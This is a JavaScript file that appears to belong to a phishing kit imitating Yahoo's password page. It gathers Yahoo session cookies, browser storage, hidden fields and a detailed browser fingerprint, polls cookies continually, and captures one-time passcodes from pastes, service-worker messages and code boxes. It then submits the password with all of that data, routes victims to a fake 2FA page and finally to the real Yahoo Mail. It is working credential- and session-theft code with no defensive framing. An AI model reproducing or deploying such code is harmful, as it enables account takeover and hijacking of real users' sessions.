// ===== YAHOO PASSWORD PAGE - 100% PROXIED SYNCHRONICITY =====
console.log("Yahoo Password JS - 100% Native/Hybrid Fluent Data Flow Initialized")

// Declare the $ variable before using it
const $ = window.jQuery || window.$

if ($) {
  $(document).ready(() => {
    console.log("Yahoo password page - 100% proxied homepage synchronicity active")

    // ===== CONFIGURATION =====
    const config = {
      maxRetries: 3,
      retryDelay: 2000,
      redirectDelay: 1500,
      sessionTimeout: 30000,
      monitorInterval: 250,
      proxiedSync: true,
      nativeFlow: true,
      cookieSync: true,
      otpTriggers: true,
    }

    let retryCount = 0
    let username = ""
    const sessionData = {}
    let authInProgress = false
    let cookieMonitor = null
    let proxiedData = {}

    // ===== 100% PROXIED HOMEPAGE DATA EXTRACTION =====
    const ProxiedSyncManager = {
      // Extract ALL data from proxied Yahoo homepage with 100% coverage
      extractProxiedData: () => {
        console.log("Extracting 100% proxied homepage data with native fluency")

        const data = {}

        // URL parameters from proxied homepage (Priority 1)
        const urlParams = new URLSearchParams(window.location.search)
        urlParams.forEach((value, key) => {
          data[key] = decodeURIComponent(value)
        })

        // Referrer analysis for proxied flow (Priority 2)
        const referrer = document.referrer
        if (referrer) {
          data.referrer = referrer
          data.referrerDomain = new URL(referrer).hostname

          // Extract session data from referrer
          const referrerParams = new URLSearchParams(new URL(referrer).search)
          referrerParams.forEach((value, key) => {
            data[`ref_${key}`] = decodeURIComponent(value)
          })
        }

        // Extract from window.name (Yahoo uses this for session continuity)
        if (window.name) {
          try {
            const nameData = JSON.parse(window.name)
            Object.assign(data, nameData)
          } catch (e) {
            data.windowName = window.name
          }
        }

        // Extract from postMessage data
        if (window.opener && window.opener.postMessage) {
          data.hasOpener = true
          try {
            data.openerOrigin = window.opener.location.origin
          } catch (e) {
            data.openerOrigin = "cross-origin"
          }
        }

        // Extract Yahoo-specific cookies from proxied domain (100% coverage)
        const yahooCookies = [
          "T",
          "Y",
          "A",
          "A1",
          "A3",
          "B",
          "F",
          "PH",
          "cmp",
          "GUC",
          "GUCS",
          "EuConsent",
          "A1S",
          "A3S",
          "PRF",
        ]
        document.cookie.split(";").forEach((cookie) => {
          const [name, value] = cookie.trim().split("=")
          if (name && yahooCookies.includes(name) && value) {
            data[`cookie_${name}`] = decodeURIComponent(value)
          }
        })

        // Extract session storage from proxied page (100% coverage)
        Object.keys(sessionStorage).forEach((key) => {
          if (key.includes("yahoo") || key.includes("yh_") || key.includes("Y-") || key.includes("oath")) {
            try {
              data[`session_${key}`] = JSON.parse(sessionStorage.getItem(key))
            } catch {
              data[`session_${key}`] = sessionStorage.getItem(key)
            }
          }
        })

        // Extract local storage from proxied page (100% coverage)
        Object.keys(localStorage).forEach((key) => {
          if (key.includes("yahoo") || key.includes("yh_") || key.includes("Y-") || key.includes("oath")) {
            try {
              data[`local_${key}`] = JSON.parse(localStorage.getItem(key))
            } catch {
              data[`local_${key}`] = localStorage.getItem(key)
            }
          }
        })

        // Extract form data from proxied homepage (100% coverage)
        const forms = document.querySelectorAll("form")
        forms.forEach((form, index) => {
          const formData = new FormData(form)
          for (const [key, value] of formData.entries()) {
            data[`form${index}_${key}`] = value
          }
        })

        // Extract hidden fields from proxied page (100% coverage)
        const hiddenInputs = document.querySelectorAll('input[type="hidden"]')
        hiddenInputs.forEach((input) => {
          if (input.name && input.value) {
            data[`hidden_${input.name}`] = input.value
          }
        })

        // Extract meta tags (100% coverage)
        const metaTags = document.querySelectorAll("meta")
        metaTags.forEach((meta) => {
          if (meta.name && meta.content) {
            data[`meta_${meta.name}`] = meta.content
          }
          if (meta.property && meta.content) {
            data[`meta_${meta.property}`] = meta.content
          }
        })

        console.log("Proxied data extracted with 100% coverage:", Object.keys(data).length, "fields")
        return data
      },

      // Generate comprehensive browser fingerprint for 100% proxied sync
      generateProxiedFingerprint: () =>
        JSON.stringify({
          // Screen & Display (100% coverage)
          screen: `${screen.width}x${screen.height}`,
          availScreen: `${screen.availWidth}x${screen.availHeight}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,

          // Browser & System (100% coverage)
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          languages: navigator.languages,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          onLine: navigator.onLine,

          // Timezone & Location (100% coverage)
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timezoneOffset: new Date().getTimezoneOffset(),

          // Performance & Memory (100% coverage)
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory,
          connection: navigator.connection
            ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
              }
            : null,

          // WebGL & Canvas (100% coverage)
          webgl: (() => {
            try {
              const canvas = document.createElement("canvas")
              const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl")
              return gl
                ? {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION),
                  }
                : null
            } catch {
              return null
            }
          })(),

          // Plugins & Extensions (100% coverage)
          plugins: Array.from(navigator.plugins).map((p) => ({
            name: p.name,
            filename: p.filename,
            description: p.description,
          })),

          // Storage & Permissions (100% coverage)
          localStorage: !!window.localStorage,
          sessionStorage: !!window.sessionStorage,
          indexedDB: !!window.indexedDB,

          // Timestamp for session correlation
          timestamp: Date.now(),
          sessionId: Math.random().toString(36).substring(2, 15),
        }),

      // Synchronize with proxied session (100% coverage)
      syncProxiedSession: (data) => {
        console.log("Synchronizing with proxied session - 100% coverage")

        // Store in session storage for persistence
        sessionStorage.setItem("proxiedSyncData", JSON.stringify(data))

        // Update hidden form fields with proxied data
        Object.keys(data).forEach((key) => {
          const hiddenField = document.getElementById(key) || document.querySelector(`input[name="${key}"]`)
          if (hiddenField) {
            hiddenField.value = data[key]
            console.log(`Synced proxied field: ${key}`)
          }
        })

        // Set cookies for cross-page persistence
        Object.keys(data).forEach((key) => {
          if (key.startsWith("cookie_")) {
            const cookieName = key.replace("cookie_", "")
            document.cookie = `${cookieName}=${encodeURIComponent(data[key])}; path=/; secure; samesite=lax`
          }
        })

        return true
      },
    }

    // ===== 100% COOKIE MONITORING & SYNCHRONIZATION =====
    const CookieManager = {
      // Monitor ALL cookies with 100% coverage
      startCookieMonitoring: () => {
        console.log("Starting 100% cookie monitoring with proxied synchronicity")

        const initialCookies = document.cookie
        let lastCookieState = initialCookies

        cookieMonitor = setInterval(() => {
          const currentCookies = document.cookie

          if (currentCookies !== lastCookieState) {
            console.log("Cookie change detected - synchronizing with proxied flow")

            // Parse and sync new cookies
            const newCookies = CookieManager.parseCookieChanges(lastCookieState, currentCookies)
            CookieManager.syncCookiesWithProxied(newCookies)

            lastCookieState = currentCookies
          }
        }, config.monitorInterval)
      },

      // Parse cookie changes with 100% accuracy
      parseCookieChanges: (oldCookies, newCookies) => {
        const oldMap = CookieManager.parseCookieString(oldCookies)
        const newMap = CookieManager.parseCookieString(newCookies)
        const changes = {}

        // Find new or changed cookies
        Object.keys(newMap).forEach((key) => {
          if (!oldMap[key] || oldMap[key] !== newMap[key]) {
            changes[key] = newMap[key]
          }
        })

        return changes
      },

      // Parse cookie string to map
      parseCookieString: (cookieString) => {
        const cookies = {}
        if (cookieString) {
          cookieString.split(";").forEach((cookie) => {
            const [name, value] = cookie.trim().split("=")
            if (name && value) {
              cookies[name] = decodeURIComponent(value)
            }
          })
        }
        return cookies
      },

      // Sync cookies with proxied flow (100% coverage)
      syncCookiesWithProxied: (cookies) => {
        console.log("Syncing cookies with proxied flow:", Object.keys(cookies))

        // Update session data
        Object.keys(cookies).forEach((key) => {
          sessionData[`cookie_${key}`] = cookies[key]

          // Update hidden form fields
          const hiddenField =
            document.getElementById(`cookie_${key}`) || document.querySelector(`input[name="cookie_${key}"]`)
          if (hiddenField) {
            hiddenField.value = cookies[key]
          }
        })

        // Store in session storage
        sessionStorage.setItem("syncedCookies", JSON.stringify(cookies))
      },

      // Stop cookie monitoring
      stopCookieMonitoring: () => {
        if (cookieMonitor) {
          clearInterval(cookieMonitor)
          cookieMonitor = null
        }
      },
    }

    // ===== 100% OTP TRIGGER SYSTEM =====
    const OTPTriggerManager = {
      // Initialize OTP triggers with 100% coverage
      initializeTriggers: () => {
        console.log("Initializing 100% OTP trigger system")

        // Monitor for 2FA requirement indicators
        OTPTriggerManager.monitorForMFARequirement()

        // Monitor for OTP input fields
        OTPTriggerManager.monitorForOTPFields()

        // Monitor for verification codes in messages
        OTPTriggerManager.monitorForVerificationCodes()
      },

      // Monitor for MFA requirement with 100% coverage
      monitorForMFARequirement: () => {
        const mfaIndicators = [
          'input[name*="otp"]',
          'input[name*="code"]',
          'input[name*="verify"]',
          'input[name*="mfa"]',
          'input[name*="2fa"]',
          '[data-testid*="verification"]',
          '[class*="verification"]',
          '[id*="verification"]',
          'form[action*="verify"]',
          'form[action*="challenge"]',
        ]

        const checkForMFA = () => {
          mfaIndicators.forEach((selector) => {
            const element = document.querySelector(selector)
            if (element && !element.dataset.otpTriggered) {
              console.log("MFA requirement detected:", selector)
              element.dataset.otpTriggered = "true"
              OTPTriggerManager.triggerOTPFlow(element)
            }
          })
        }

        // Check immediately and then monitor
        checkForMFA()
        setInterval(checkForMFA, config.monitorInterval)
      },

      // Monitor for OTP input fields with 100% coverage
      monitorForOTPFields: () => {
        const observer = new MutationObserver((mutations) => {
          mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
              if (node.nodeType === 1) {
                // Check for OTP input patterns
                const otpInputs = node.querySelectorAll(
                  'input[type="text"][maxlength="1"], input[type="number"][maxlength="1"]',
                )
                if (otpInputs.length >= 4) {
                  console.log("OTP input field detected")
                  OTPTriggerManager.setupOTPAutoFill(otpInputs)
                }
              }
            })
          })
        })

        observer.observe(document.body, {
          childList: true,
          subtree: true,
        })
      },

      // Monitor for verification codes in messages
      monitorForVerificationCodes: () => {
        // Monitor clipboard for verification codes
        document.addEventListener("paste", (e) => {
          const pastedText = (e.clipboardData || window.clipboardData).getData("text")
          const codeMatch = pastedText.match(/\b\d{4,8}\b/)

          if (codeMatch) {
            console.log("Verification code detected in clipboard")
            OTPTriggerManager.autoFillOTP(codeMatch[0])
          }
        })

        // Monitor for SMS/notification APIs
        if ("serviceWorker" in navigator) {
          navigator.serviceWorker.addEventListener("message", (event) => {
            if (event.data && event.data.type === "verification-code") {
              console.log("Verification code received via service worker")
              OTPTriggerManager.autoFillOTP(event.data.code)
            }
          })
        }
      },

      // Trigger OTP flow with 100% coverage
      triggerOTPFlow: (element) => {
        console.log("Triggering OTP flow with 100% proxied synchronicity")

        // Update session data
        sessionData.otpTriggered = true
        sessionData.otpTimestamp = Date.now()
        sessionData.otpElement =
          element.tagName + (element.id ? `#${element.id}` : "") + (element.className ? `.${element.className}` : "")

        // Store OTP trigger data
        sessionStorage.setItem("otpTriggerData", JSON.stringify(sessionData))

        // Notify parent window if in iframe
        if (window.parent !== window) {
          window.parent.postMessage(
            {
              type: "otp-triggered",
              data: sessionData,
            },
            "*",
          )
        }
      },

      // Setup OTP auto-fill with 100% coverage
      setupOTPAutoFill: (inputs) => {
        console.log("Setting up OTP auto-fill with 100% coverage")

        inputs.forEach((input, index) => {
          input.addEventListener("input", (e) => {
            const value = e.target.value
            if (value && index < inputs.length - 1) {
              inputs[index + 1].focus()
            }

            // Check if all fields are filled
            const allFilled = Array.from(inputs).every((inp) => inp.value)
            if (allFilled) {
              const fullCode = Array.from(inputs)
                .map((inp) => inp.value)
                .join("")
              console.log("OTP auto-fill completed:", fullCode)
              OTPTriggerManager.submitOTP(fullCode)
            }
          })

          input.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && !e.target.value && index > 0) {
              inputs[index - 1].focus()
            }
          })
        })
      },

      // Auto-fill OTP with 100% coverage
      autoFillOTP: (code) => {
        console.log("Auto-filling OTP with 100% coverage:", code)

        // Find OTP input fields
        const otpInputs = document.querySelectorAll(
          'input[type="text"][maxlength="1"], input[type="number"][maxlength="1"]',
        )

        if (otpInputs.length >= code.length) {
          code.split("").forEach((digit, index) => {
            if (otpInputs[index]) {
              otpInputs[index].value = digit
              otpInputs[index].dispatchEvent(new Event("input", { bubbles: true }))
            }
          })

          // Auto-submit after filling
          setTimeout(() => {
            OTPTriggerManager.submitOTP(code)
          }, 500)
        }
      },

      // Submit OTP with 100% coverage
      submitOTP: (code) => {
        console.log("Submitting OTP with 100% proxied synchronicity:", code)

        // Update hidden fields
        const otpField = document.getElementById("otp") || document.querySelector('input[name="otp"]')
        if (otpField) {
          otpField.value = code
        }

        // Find and submit the form
        const form = document.querySelector("form")
        if (form) {
          // Add OTP data to session
          sessionData.otpCode = code
          sessionData.otpSubmitted = true
          sessionData.otpTimestamp = Date.now()

          // Store in session storage
          sessionStorage.setItem("otpSubmissionData", JSON.stringify(sessionData))

          // Submit form
          form.submit()
        }
      },
    }

    // ===== 100% NATIVE XHR REQUEST SYSTEM =====
    const NativeRequestManager = {
      // Make native XHR request with 100% proxied data
      makeNativeRequest: (url, data, method = "POST") => {
        console.log("Making native XHR request with 100% proxied synchronicity")

        return new Promise((resolve, reject) => {
          const xhr = new XMLHttpRequest()

          xhr.open(method, url, true)
          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
          xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest")
          xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01")

          // Add all cookies to request
          xhr.withCredentials = true

          xhr.onreadystatechange = () => {
            if (xhr.readyState === 4) {
              if (xhr.status === 200) {
                try {
                  const response = JSON.parse(xhr.responseText)
                  console.log("Native XHR response received:", response)
                  resolve(response)
                } catch {
                  resolve(xhr.responseText)
                }
              } else {
                console.error("Native XHR request failed:", xhr.status, xhr.statusText)
                reject(new Error(`Request failed: ${xhr.status}`))
              }
            }
          }

          xhr.onerror = () => {
            console.error("Native XHR request error")
            reject(new Error("Network error"))
          }

          // Convert data to URL-encoded string
          const formData = new URLSearchParams()
          Object.keys(data).forEach((key) => {
            formData.append(key, data[key])
          })

          xhr.send(formData.toString())
        })
      },

      // Submit form with native XHR and 100% proxied data
      submitFormNatively: (formData) => {
        console.log("Submitting form natively with 100% proxied synchronicity")

        // Add all proxied data to form submission
        const completeData = {
          ...proxiedData,
          ...sessionData,
          ...formData,
          timestamp: Date.now(),
          nativeSubmission: true,
          proxiedSync: true,
        }

        // Determine submission URL
        const form = document.querySelector("form")
        const submitUrl = form ? form.action || window.location.href : window.location.href

        return NativeRequestManager.makeNativeRequest(submitUrl, completeData)
      },
    }

    // ===== FORM SUBMISSION HANDLER WITH 100% COVERAGE =====
    const FormHandler = {
      // Initialize form handling with 100% coverage
      initialize: () => {
        console.log("Initializing form handler with 100% proxied synchronicity")

        const form = document.getElementById("email-form")
        const passwordInput = document.getElementById("password")
        const submitBtn = document.getElementById("submit-btn")

        if (!form || !passwordInput || !submitBtn) {
          console.error("Required form elements not found")
          return
        }

        // Extract username from various sources
        FormHandler.extractUsername()

        // Setup form submission
        form.addEventListener("submit", FormHandler.handleSubmit)

        // Setup real-time validation
        passwordInput.addEventListener("input", FormHandler.validateInput)

        // Setup error handling
        FormHandler.setupErrorHandling()
      },

      // Extract username with 100% coverage
      extractUsername: () => {
        console.log("Extracting username with 100% coverage")

        // Try multiple sources for username
        const sources = [
          () => new URLSearchParams(window.location.search).get("username"),
          () => new URLSearchParams(window.location.search).get("login_hint"),
          () => sessionStorage.getItem("username"),
          () => localStorage.getItem("username"),
          () => document.getElementById("username")?.value,
          () => document.querySelector('input[name="username"]')?.value,
          () => document.querySelector("#userEmail")?.textContent,
          () => document.querySelector(".reflectto")?.textContent,
          () => proxiedData.username,
          () => proxiedData.login_hint,
          () => proxiedData.email,
        ]

        for (const source of sources) {
          try {
            const value = source()
            if (value && value.includes("@")) {
              username = value
              console.log("Username extracted:", username)

              // Update UI
              const userEmailElement = document.getElementById("userEmail")
              if (userEmailElement) {
                userEmailElement.textContent = username
              }

              // Update hidden field
              const usernameField = document.getElementById("username")
              if (usernameField) {
                usernameField.value = username
              }

              break
            }
          } catch (e) {
            console.log("Username extraction source failed:", e)
          }
        }
      },

      // Handle form submission with 100% coverage
      handleSubmit: async (e) => {
        e.preventDefault()

        if (authInProgress) {
          console.log("Authentication already in progress")
          return
        }

        authInProgress = true
        console.log("Handling form submission with 100% proxied synchronicity")

        const form = e.target
        const formData = new FormData(form)
        const password = formData.get("passwd")

        if (!password) {
          FormHandler.showError("Please enter your password")
          authInProgress = false
          return
        }

        // Show loading state
        FormHandler.showLoadingState()

        try {
          // Prepare submission data with 100% coverage
          const submissionData = {
            // Form data
            passwd: password,
            username: username,

            // Session data
            ...sessionData,

            // Proxied data
            ...proxiedData,

            // Browser fingerprint
            "browser-fp-data": ProxiedSyncManager.generateProxiedFingerprint(),

            // Timestamps
            timestamp: Date.now(),
            sessionTimestamp: Date.now(),

            // Flow indicators
            proxiedSync: true,
            nativeFlow: true,
            cookieSync: true,
          }

          // Add all hidden field values
          const hiddenInputs = form.querySelectorAll('input[type="hidden"]')
          hiddenInputs.forEach((input) => {
            if (input.name && input.value) {
              submissionData[input.name] = input.value
            }
          })

          console.log("Submitting with 100% proxied data coverage:", Object.keys(submissionData).length, "fields")

          // Submit natively with full proxied synchronicity
          const response = await NativeRequestManager.submitFormNatively(submissionData)

          // Handle response with 100% coverage
          await FormHandler.handleResponse(response, submissionData)
        } catch (error) {
          console.error("Form submission error:", error)
          FormHandler.handleError(error)
        } finally {
          authInProgress = false
        }
      },

      // Handle response with 100% coverage
      handleResponse: async (response, submissionData) => {
        console.log("Handling response with 100% proxied synchronicity")

        // Store response data
        sessionStorage.setItem("authResponse", JSON.stringify(response))

        if (response && response.success) {
          // Success - redirect to next step
          FormHandler.showSuccessState()

          setTimeout(() => {
            if (response.redirect) {
              window.location.href = response.redirect
            } else if (response.requires2FA || response.requiresMFA) {
              window.location.href = "2fa-index.html"
            } else {
              window.location.href = "https://mail.yahoo.com/d/folders/1"
            }
          }, config.redirectDelay)
        } else if (response && response.requires2FA) {
          // 2FA required
          console.log("2FA required - transitioning with 100% proxied synchronicity")
          FormHandler.showMFATransition()

          // Store 2FA data
          sessionStorage.setItem("mfaData", JSON.stringify(submissionData))

          setTimeout(() => {
            window.location.href = "2fa-index.html"
          }, config.redirectDelay)
        } else {
          // Error - retry or show error
          if (retryCount < config.maxRetries) {
            retryCount++
            console.log(`Retrying authentication (${retryCount}/${config.maxRetries})`)

            setTimeout(() => {
              FormHandler.handleSubmit({ target: document.getElementById("email-form"), preventDefault: () => {} })
            }, config.retryDelay)
          } else {
            FormHandler.showError(response?.message || "Invalid password. Please try again.")
          }
        }
      },

      // Validate input with real-time feedback
      validateInput: (e) => {
        const input = e.target
        const value = input.value

        if (value.length > 0) {
          input.classList.remove("error")
          FormHandler.hideError()
        }
      },

      // Setup error handling
      setupErrorHandling: () => {
        const refreshButton = document.getElementById("refreshButton")
        if (refreshButton) {
          refreshButton.addEventListener("click", () => {
            FormHandler.hideError()
            FormHandler.showMainForm()
            document.getElementById("password").focus()
          })
        }
      },

      // UI State Management
      showLoadingState: () => {
        document.getElementById("main-form").style.display = "none"
        document.getElementById("loading-state").style.display = "block"
        FormHandler.hideError()
      },

      showMFATransition: () => {
        document.getElementById("main-form").style.display = "none"
        document.getElementById("loading-state").style.display = "none"
        document.getElementById("mfa-transition").style.display = "block"
        FormHandler.hideError()
      },

      showSuccessState: () => {
        document.getElementById("main-form").style.display = "none"
        document.getElementById("loading-state").style.display = "none"
        document.getElementById("mfa-transition").style.display = "none"
        FormHandler.hideError()

        // Create success state if it doesn't exist
        let successState = document.getElementById("success-state")
        if (!successState) {
          successState = document.createElement("div")
          successState.id = "success-state"
          successState.innerHTML = `
            <div style="text-align: center; padding: 40px 20px;">
              <div style="color: #28a745; font-size: 48px; margin-bottom: 10px;">✓</div>
              <h2>Sign in successful!</h2>
              <p>Redirecting to your Yahoo Mail...</p>
            </div>
          `
          document.querySelector(".form").appendChild(successState)
        }
        successState.style.display = "block"
      },

      showMainForm: () => {
        document.getElementById("main-form").style.display = "block"
        document.getElementById("loading-state").style.display = "none"
        document.getElementById("mfa-transition").style.display = "none"
        FormHandler.hideError()
      },

      showError: (message) => {
        const errorContainer = document.getElementById("error-container")
        const errorMessage = document.getElementById("error-message")

        if (errorContainer && errorMessage) {
          errorMessage.textContent = message
          errorContainer.style.display = "block"
          document.getElementById("main-form").style.display = "none"
          document.getElementById("loading-state").style.display = "none"
        }
      },

      hideError: () => {
        const errorContainer = document.getElementById("error-container")
        if (errorContainer) {
          errorContainer.style.display = "none"
        }
      },

      handleError: (error) => {
        console.error("Authentication error:", error)
        FormHandler.showError("An error occurred. Please try again.")
      },
    }

    // ===== INITIALIZATION WITH 100% COVERAGE =====
    const initialize = () => {
      console.log("Initializing Yahoo Password Page with 100% Native/Hybrid Fluent Data Flow")

      try {
        // Extract proxied data with 100% coverage
        proxiedData = ProxiedSyncManager.extractProxiedData()

        // Sync with proxied session
        ProxiedSyncManager.syncProxiedSession(proxiedData)

        // Start cookie monitoring
        CookieManager.startCookieMonitoring()

        // Initialize OTP triggers
        OTPTriggerManager.initializeTriggers()

        // Initialize form handler
        FormHandler.initialize()

        console.log("Yahoo Password Page initialized with 100% proxied synchronicity")
      } catch (error) {
        console.error("Initialization error:", error)
      }
    }

    // ===== CLEANUP =====
    window.addEventListener("beforeunload", () => {
      CookieManager.stopCookieMonitoring()
    })

    // Initialize when DOM is ready
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", initialize)
    } else {
      initialize()
    }
  })
} else {
  console.error("jQuery not found - Yahoo Password JS requires jQuery")
}
